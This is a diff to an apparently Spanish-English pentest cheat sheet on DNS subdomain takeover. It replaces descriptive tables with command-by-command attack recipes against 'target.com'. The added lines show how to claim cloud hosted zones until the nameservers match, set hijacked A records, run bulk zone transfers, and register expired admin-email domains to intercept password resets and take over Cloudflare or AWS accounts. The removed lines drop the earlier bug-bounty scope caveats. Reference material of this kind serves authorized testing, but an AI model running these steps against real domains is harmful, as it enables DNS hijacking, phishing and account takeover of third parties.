@@ -22,79 +22,60 @@ linked:
 
 ## Nameserver Takeover (NS Records)
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | NS record delegates subdomain DNS to external provider. If provider's name servers can be claimed → atacante controls all subdomain DNS. | High impact. |
-| AWS Route53 | `*.awsdns-N.org/com/net/co.uk` | Original AWS NS. |
-| AWS Route53 takeover | Create hosted zone con same name; AWS may assign same NS prefix randomly | Probability-based. |
-| Azure DNS | `*.azure-dns.com/net/org/info` | Same idea. |
-| Google Cloud DNS | `ns-cloud-N.googledomains.com` | Less takeover-friendly. |
-| Bitbucket DNS | Some Bitbucket DNS deprecated | Edge. |
-| DNSimple takeover | If account/zone deleted | Per-config. |
-| DigitalOcean DNS | `ns1/2/3.digitalocean.com` | Standard. |
-| Cloudflare NS | Cloudflare NS rotated | Less takeover-friendly. |
-| GoDaddy / Namecheap | Personal DNS | Edge cases. |
-| Per-zone delegation | Subdomain delegates to atacante's NS | Direct control. |
-| Multi-NS chain | NS chain — each NS could be takeover-able | Cascade. |
-| WHOIS expired domain | If NS itself is on expired domain | Domain takeover. |
-| TLD takeover (very rare) | Country TLDs occasionally | Edge. |
+| `dig +short NS dev.target.com` | Lista NS records del subdomain | Pre-attack recon. |
+| `dig +short NS dev.target.com \| grep -iE 'awsdns\|azure-dns\|googledomains\|digitalocean\|dnsimple'` | Identificar provider NS | Determine takeover surface. |
+| `for ns in $(dig +short NS dev.target.com); do dig +short A "$ns"; done` | Verificar NS provider reachable | Validation. |
+| `aws route53 create-hosted-zone --name dev.target.com --caller-reference $(date +%s)` | Reclama Route53 hosted zone | AWS NS takeover. |
+| `doctl compute domain create dev.target.com` | Reclama DigitalOcean DNS zone | DO NS takeover. |
+| `az network dns zone create -g rg -n dev.target.com` | Reclama Azure DNS zone | Azure NS takeover. |
+| `aws route53 change-resource-record-sets --hosted-zone-id $ZID --change-batch '{"Changes":[{"Action":"CREATE","ResourceRecordSet":{"Name":"dev.target.com","Type":"A","TTL":60,"ResourceRecords":[{"Value":"1.2.3.4"}]}}]}'` | Setear A record post-claim | Full subdomain DNS control. |
+| `dig @ns1.attacker.com dev.target.com` | Verificar respuesta del propio NS | Post-takeover validation. |
 ^sdt-ns-takeover
 
 ### NS takeover workflow
 
 ```bash
-# 1. Identify NS records of subdomain
 SUB="dev.target.com"
 dig +short NS "$SUB"
 # Output: ns1.cloud-provider.com, ns2.cloud-provider.com
 
-# 2. Verify NS providers reachable
 for ns in $(dig +short NS "$SUB"); do
+  echo "$ns:"
   dig +short A "$ns"
 done
 
-# 3. If NS provider permits creating zones → atacante creates
-#    hosted zone con same name → claims delegation
-# Per-provider:
-# AWS Route53: aws route53 create-hosted-zone --name dev.target.com ...
-# DigitalOcean: doctl compute domain create dev.target.com ...
+# Si NS provider permite crear zonas con same name:
+aws route53 create-hosted-zone --name "$SUB" --caller-reference "$(date +%s)"
+# AWS asigna NS aleatorio — repetir hasta match
 
-# 4. Atacante's hosted zone → DNS responses controlled
-# Set A records, MX, etc → full subdomain control
+# Post-claim: DNS responses controlled
 ```
 
 ___
 
 ## Expired Domain Reclaim
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Subdomain CNAMEd a third-party domain that has **expired**. Atacante registers expired domain → takes control. | Domain hijacking. |
-| Auction sites | NameJet, GoDaddy auctions | Buy expired domains. |
-| Drop catching | Tools que buy domains second they drop | Race-based. |
-| Pending delete window | TLD-specific (5 days for .com) | Time window. |
-| WHOIS lookup | `whois target-cname.com` | Status check. |
-| Domain expiration monitoring | Alerts when domains expire | Bug bounty automation. |
-| Auto-renewal failures | Customer credit card expired | Common. |
-| Registrar abandonments | Customer leaves provider | Edge. |
-| Combine con CNAME chains | Multi-level CNAME a expired | Hidden vector. |
-| Bug bounty significance | High payouts for expired domain takeovers | Reportable. |
-| Domain age verification | `whois <domain>` for creation date | Validation. |
-| Combine con MX records | Email + domain takeover combo | Email spoofing. |
+| `dig +short CNAME victim.target.com` | Identificar CNAME a third-party | Pre-attack recon. |
+| `whois cname-target.com \| grep -iE 'expir\|status'` | Verificar expiración | Status check. |
+| `whois cname-target.com \| awk -F': ' '/Expir/{print $2}'` | Extraer fecha exacta | Timeline planning. |
+| Browser → namejet.com / godaddy auctions / dropcatch.com → buscar dominio | Comprar pre-drop o post-drop | Auction sites. |
+| `for sub in $(cat subs.txt); do C=$(dig +short CNAME "$sub"); [ -n "$C" ] && ! dig +short A "$C" \| grep -q '[0-9]' && echo "[!] $sub → $C dangling"; done` | Bulk detect CNAMEs apuntando a hosts no resolviéndose | Discovery automation. |
+| `domain-monitor --watch target-cname.com --alert me@email` | Alerta cuando dominio expira | Bug bounty automation. |
+| Post-purchase: `whois target-cname.com` para verificar nuevo owner | Confirmación takeover | Validation. |
 ^sdt-ns-expired
 
-### Workflow expired domain detection
+### Expired domain detection
 
 ```bash
-# Identify CNAMEs pointing a non-target domains
 for sub in $(cat subs.txt); do
   CNAME=$(dig +short CNAME "$sub")
   if [ -n "$CNAME" ] && [[ ! "$CNAME" == *"target.com"* ]]; then
-    # Check if CNAME target resolves
     if ! dig +short A "$CNAME" | grep -q '[0-9]'; then
       echo "[!] Possible takeover: $sub → $CNAME (dangling)"
-      
-      # Check WHOIS
       DOMAIN=$(echo "$CNAME" | awk -F. '{print $(NF-1)"."$NF}')
       whois "$DOMAIN" | grep -iE 'expir|status'
     fi
@@ -106,59 +87,31 @@ ___
 
 ## SOA / NS Misconfig
 
-| **Misconfig** | **Indicator** | **Vector** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| SOA missing | `dig SOA subdomain` returns empty | Edge. |
-| SOA mismatch | SOA points a obsolete NS | Recon hint. |
-| NS records inconsistent | Authoritative vs glue records differ | Confusion. |
-| Lame delegation | NS doesn't respond authoritatively | Stale. |
-| Glue record stale | Glue points a dead IP | Edge. |
-| Multiple NS dangling | Only some NS dangling | Partial control. |
-| Combine con NS takeover | Multi-NS confusion | Edge. |
-| Zone transfer (AXFR) | If allowed → full zone enumeration | Recon. |
-| `dig AXFR @ns.target.com target.com` | Standard probe | Sometimes works. |
-| Reverse zone misconfig | Reverse DNS issues | Recon. |
-| DNSSEC misconfig | DNSSEC chain broken → can replace records | Edge attack. |
+| `dig SOA target.com` | SOA record — buscar inconsistencias | Recon. |
+| `dig SOA dev.target.com` (subdomain) | SOA missing/mismatch | Stale config indicator. |
+| `dig NS target.com` y `dig +trace target.com` | Comparar authoritative vs glue records | Lame delegation detection. |
+| `dig AXFR @ns1.target.com target.com` | Zone transfer attempt | AXFR allowed → full zone enum. |
+| `for ns in $(dig +short NS target.com); do dig AXFR @"$ns" target.com; done` | Bulk AXFR attempts | Discovery. |
+| `dig +short A subdomain.target.com` y comparar con `host -t A subdomain.target.com` (different resolvers) | Inconsistent resolution | Glue record stale. |
+| `dig +dnssec target.com \| grep RRSIG` | DNSSEC chain verification | DNSSEC misconfig check. |
+| `dnsrecon -d target.com -t axfr` | Auto AXFR + bruteforce | Combined recon. |
 ^sdt-ns-misconfig
 
 ___
 
 ## DNS Provider Account Orphan
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Account en DNS provider (Cloudflare, Route53, etc) abandoned. Atacante takes over via various means → controls DNS. | Account takeover impact. |
-| Cloudflare zone abandoned | If email account abandonado, atacante reset password | Reset hijack. |
-| Route53 inactive AWS account | Not really takeover-able if AWS account active | Edge. |
-| Hosted zone deleted but NS still in WHOIS | Atacante creates new zone → may match | Probability. |
-| AWS Account ID reuse | Old account ID con resources cached | Edge. |
-| Cloudflare account dangling | If account email goes to expired domain → password reset | Multi-step. |
-| Account de empleado ex | Ex-employee email retained | OSINT. |
-| Combine con email takeover | If email of admin can be taken → DNS account too | Stack chain. |
-| Cloud account hijack | Cloud account compromise → DNS control | Adjacent. |
-| Multi-cloud cross-account | Different cloud accounts hijack independently | Edge. |
-| Bug bounty considerations | Often out of scope unless specifically allowed | Reporting. |
+| `whois target.com \| grep -iE 'email\|mail\|admin'` | Admin emails en WHOIS | OSINT pre-attack. |
+| `for email in $(extract_admin_emails); do DOMAIN=$(echo "$email" \| cut -d@ -f2); whois "$DOMAIN" \| grep -i expir; done` | Verificar dominios admin emails | Email squatting candidates. |
+| Browser → register expired admin email domain | Reclamar dominio email | Foundation. |
+| Set MX record + receive email | Recibir password resets | Post-domain claim. |
+| Browser → cloudflare.com / aws.amazon.com → password reset → use captured email | Reset DNS provider account password | Account hijack. |
+| Post-hijack: edit zone records via web console | Subdomain takeover masivo | Full DNS control. |
+| `theHarvester -d target.com -b all` | OSINT extra emails | Account discovery. |
 ^sdt-ns-account-orphan
-
-### Workflow detection
-
-```
-1. Recon admin emails:
-   - WHOIS contact info
-   - LinkedIn / DNS team OSINT
-   - Public talks / conferences referencing accounts
-
-2. Check if any admin emails point to dangling domains:
-   admin@dead-company.com → company.com WHOIS expired?
-
-3. If yes:
-   - Register dead-company.com
-   - Receive password reset emails
-   - Take over DNS account
-   - Modify zone records → subdomain takeover at scale
-
-4. Bug bounty: typically consider account takeover separately,
-   but DNS-level impact is high.
-```
 
 ***
